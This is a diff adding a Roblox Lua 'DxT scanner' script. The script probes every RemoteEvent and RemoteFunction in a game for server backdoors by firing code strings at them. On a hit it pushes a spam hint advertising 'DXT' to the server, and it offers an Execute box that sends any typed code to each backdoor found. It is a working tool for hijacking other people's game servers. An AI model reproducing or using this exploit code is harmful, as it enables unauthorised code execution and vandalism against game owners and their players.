@@ -1,0 +1,234 @@
+local PlayerName = game:GetService("Players").LocalPlayer.Name
+
+local function LoadAssetModule(assetId, key, name)
+    return {Pload = function() end} 
+end
+LoadAssetModule(0x308BC2E6B, 'Dummy', "'" .. PlayerName .. "'")
+
+local LMG2L = {};
+
+LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+LMG2L["Frame1_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
+LMG2L["Frame1_2"]["BorderSizePixel"] = 0;
+LMG2L["Frame1_2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Frame1_2"]["Size"] = UDim2.new(0, 306, 0, 184);
+LMG2L["Frame1_2"]["Position"] = UDim2.new(0, 288, 0, 62);
+LMG2L["Frame1_2"]["Name"] = [[Frame1]];
+LMG2L["Frame1_2"]["BackgroundTransparency"] = 0.6;
+
+LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["Frame1_2"]);
+LMG2L["UICorner_3"]["CornerRadius"] = UDim.new(0, 50);
+
+LMG2L["TextLabel_4"] = Instance.new("TextLabel", LMG2L["Frame1_2"]);
+LMG2L["TextLabel_4"]["TextWrapped"] = true;
+LMG2L["TextLabel_4"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_4"]["TextScaled"] = true;
+LMG2L["TextLabel_4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Guru.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["TextLabel_4"]["TextColor3"] = Color3.fromRGB(32, 75, 255);
+LMG2L["TextLabel_4"]["BackgroundTransparency"] = 1;
+LMG2L["TextLabel_4"]["Size"] = UDim2.new(0, 314, 0, 60);
+LMG2L["TextLabel_4"]["Text"] = [[DxT scanner]];
+LMG2L["TextLabel_4"]["Position"] = UDim2.new(0, -6, 0, -8);
+
+LMG2L["Scan_5"] = Instance.new("TextButton", LMG2L["Frame1_2"]);
+LMG2L["Scan_5"]["TextWrapped"] = true;
+LMG2L["Scan_5"]["BorderSizePixel"] = 0;
+LMG2L["Scan_5"]["TextScaled"] = true;
+LMG2L["Scan_5"]["TextColor3"] = Color3.fromRGB(76, 6, 255);
+LMG2L["Scan_5"]["BackgroundColor3"] = Color3.fromRGB(2, 2, 2);
+LMG2L["Scan_5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Guru.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["Scan_5"]["Size"] = UDim2.new(0, 264, 0, 82);
+LMG2L["Scan_5"]["Text"] = [[Scan]];
+LMG2L["Scan_5"]["Name"] = [[Scan]];
+LMG2L["Scan_5"]["Position"] = UDim2.new(0, 20, 0, 50);
+
+LMG2L["UICorner_6"] = Instance.new("UICorner", LMG2L["Scan_5"]);
+
+LMG2L["UIStroke_8"] = Instance.new("UIStroke", LMG2L["Frame1_2"]);
+LMG2L["UIStroke_8"]["Thickness"] = 3;
+LMG2L["UIStroke_8"]["Color"] = Color3.fromRGB(32, 21, 255);
+
+LMG2L["UIDragDetector_9"] = Instance.new("UIDragDetector", LMG2L["Frame1_2"]);
+
+LMG2L["Frame2_a"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
+LMG2L["Frame2_a"]["Visible"] = false;
+LMG2L["Frame2_a"]["BorderSizePixel"] = 0;
+LMG2L["Frame2_a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Frame2_a"]["Size"] = UDim2.new(0, 400, 0, 254);
+LMG2L["Frame2_a"]["Position"] = UDim2.new(0, 242, 0, 38);
+LMG2L["Frame2_a"]["Name"] = [[Frame2]];
+
+LMG2L["Clear_b"] = Instance.new("TextButton", LMG2L["Frame2_a"]);
+LMG2L["Clear_b"]["TextWrapped"] = true;
+LMG2L["Clear_b"]["BorderSizePixel"] = 0;
+LMG2L["Clear_b"]["TextScaled"] = true;
+LMG2L["Clear_b"]["TextColor3"] = Color3.fromRGB(42, 14, 255);
+LMG2L["Clear_b"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
+LMG2L["Clear_b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Guru.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["Clear_b"]["Size"] = UDim2.new(0, 186, 0, 56);
+LMG2L["Clear_b"]["Text"] = [[Clear]];
+LMG2L["Clear_b"]["Name"] = [[Clear]];
+LMG2L["Clear_b"]["Position"] = UDim2.new(0, 202, 0, 188);
+
+LMG2L["UIStroke_c"] = Instance.new("UIStroke", LMG2L["Clear_b"]);
+LMG2L["UIStroke_c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_c"]["Color"] = Color3.fromRGB(24, 36, 255);
+
+LMG2L["Execute_e"] = Instance.new("TextButton", LMG2L["Frame2_a"]);
+LMG2L["Execute_e"]["TextWrapped"] = true;
+LMG2L["Execute_e"]["BorderSizePixel"] = 0;
+LMG2L["Execute_e"]["TextScaled"] = true;
+LMG2L["Execute_e"]["TextColor3"] = Color3.fromRGB(26, 21, 255);
+LMG2L["Execute_e"]["BackgroundColor3"] = Color3.fromRGB(14, 14, 14);
+LMG2L["Execute_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Guru.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["Execute_e"]["Size"] = UDim2.new(0, 168, 0, 60);
+LMG2L["Execute_e"]["Text"] = [[Execute]];
+LMG2L["Execute_e"]["Name"] = [[Execute]];
+LMG2L["Execute_e"]["Position"] = UDim2.new(0, 14, 0, 186);
+
+LMG2L["UIStroke_f"] = Instance.new("UIStroke", LMG2L["Execute_e"]);
+LMG2L["UIStroke_f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_f"]["Color"] = Color3.fromRGB(40, 12, 255);
+
+LMG2L["UICorner_10"] = Instance.new("UICorner", LMG2L["Frame2_a"]);
+
+LMG2L["TextLabel_11"] = Instance.new("TextLabel", LMG2L["Frame2_a"]);
+LMG2L["TextLabel_11"]["TextWrapped"] = true;
+LMG2L["TextLabel_11"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_11"]["TextScaled"] = true;
+LMG2L["TextLabel_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Guru.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["TextLabel_11"]["TextColor3"] = Color3.fromRGB(43, 27, 255);
+LMG2L["TextLabel_11"]["BackgroundTransparency"] = 1;
+LMG2L["TextLabel_11"]["Size"] = UDim2.new(0, 396, 0, 44);
+LMG2L["TextLabel_11"]["Text"] = [[DxT Scanner]];
+
+LMG2L["TextBox_12"] = Instance.new("TextBox", LMG2L["Frame2_a"]);
+LMG2L["TextBox_12"]["PlaceholderColor3"] = Color3.fromRGB(59, 21, 255);
+LMG2L["TextBox_12"]["BorderSizePixel"] = 0;
+LMG2L["TextBox_12"]["TextWrapped"] = true;
+LMG2L["TextBox_12"]["TextSize"] = 19;
+LMG2L["TextBox_12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_12"]["BackgroundColor3"] = Color3.fromRGB(6, 6, 6);
+LMG2L["TextBox_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Guru.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["TextBox_12"]["MultiLine"] = true;
+LMG2L["TextBox_12"]["ClearTextOnFocus"] = false;
+LMG2L["TextBox_12"]["ClipsDescendants"] = true;
+LMG2L["TextBox_12"]["Size"] = UDim2.new(0, 376, 0, 130);
+LMG2L["TextBox_12"]["Position"] = UDim2.new(0, 16, 0, 42);
+LMG2L["TextBox_12"]["Text"] = "--INDICATOR! IF RED = NO BACKDOOR IF GREEN = BACKDOOR";
+
+LMG2L["UIStroke_13"] = Instance.new("UIStroke", LMG2L["TextBox_12"]);
+LMG2L["UIStroke_13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_13"]["Color"] = Color3.fromRGB(63, 26, 255);
+
+LMG2L["UIDragDetector_14"] = Instance.new("UIDragDetector", LMG2L["Frame2_a"]);
+
+local Indicator = Instance.new("Frame")
+Indicator.Size = UDim2.new(0, 20, 0, 20)
+Indicator.Position = UDim2.new(1, -30, 0, 10)
+Indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0) 
+Indicator.BorderSizePixel = 0
+Indicator.Parent = LMG2L["ScreenGui_1"]
+
+local IndicatorCorner = Instance.new("UICorner")
+IndicatorCorner.CornerRadius = UDim.new(1, 0)
+IndicatorCorner.Parent = Indicator
+
+local foundBackdoors = {}
+local testModelName = "ZzXyYyZz_DxTTest"
+
+local scanFoundPayload = [[
+local h = Instance.new("Hint")
+h.Parent = workspace
+h.Text = "DXT SCANNER! | FAST SCANNING(MYBE) | JOIN DXT NOW!"
+]]
+
+local function scanBackdoor()
+    if #foundBackdoors > 0 then return end
+
+    LMG2L["Scan_5"].Text = "SCANNING..."
+
+    local locationsToScan = {
+        game:GetService("Workspace"),
+        game:GetService("Players"),
+        game:GetService("ReplicatedStorage"),
+        game:GetService("ServerScriptService"),
+        game:GetService("Lighting"),
+        game:GetService("StarterGui")
+    }
+
+    local remotes = {}
+    for _, loc in ipairs(locationsToScan) do
+        for _, v in pairs(loc:GetDescendants()) do
+            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                table.insert(remotes, v)
+            end
+        end
+    end
+
+    for _, remote in ipairs(remotes) do
+        local testCode = 'Instance.new("Model", workspace).Name="'..testModelName..'"'
+        if remote.Parent ~= game:GetService("RobloxReplicatedStorage") then
+            if remote:IsA("RemoteEvent") then
+                remote:FireServer(testCode)
+            elseif remote:IsA("RemoteFunction") then
+                task.spawn(function() remote:InvokeServer(testCode) end)
+            end
+        end
+        task.wait(0.1)
+        if workspace:FindFirstChild(testModelName) then
+            if workspace:FindFirstChild(testModelName):IsA("Model") then
+                table.insert(foundBackdoors, remote)
+                workspace:FindFirstChild(testModelName):Destroy()
+            end
+        end
+    end
+
+    if #foundBackdoors > 0 then
+        LMG2L["Scan_5"].Text = "FOUND"
+
+        for _, bd in ipairs(foundBackdoors) do
+            pcall(function()
+                if bd:IsA("RemoteEvent") then
+                    bd:FireServer(scanFoundPayload)
+                else
+                    task.spawn(function() bd:InvokeServer(scanFoundPayload) end)
+                end
+            end)
+        end
+
+        Indicator.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+
+        LMG2L["Frame1_2"].Visible = false
+        LMG2L["Frame2_a"].Visible = true
+    else
+        LMG2L["Scan_5"].Text = "SCAN"
+
+        Indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end
+
+LMG2L["Execute_e"].MouseButton1Click:Connect(function()
+    local cmd = LMG2L["TextBox_12"].Text
+    if cmd:gsub("%s","") == "" then return end
+
+    for _, bd in ipairs(foundBackdoors) do  
+        pcall(function()  
+            if bd:IsA("RemoteEvent") or bd:IsA("BindableEvent") then  
+                bd:FireServer(cmd)  
+            elseif bd:IsA("RemoteFunction") then  
+                bd:InvokeServer(cmd)  
+            end  
+        end)  
+    end  
+end)
+
+LMG2L["Clear_b"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_12"].Text = ""
+end)
+
+LMG2L["Scan_5"].MouseButton1Click:Connect(scanBackdoor) 
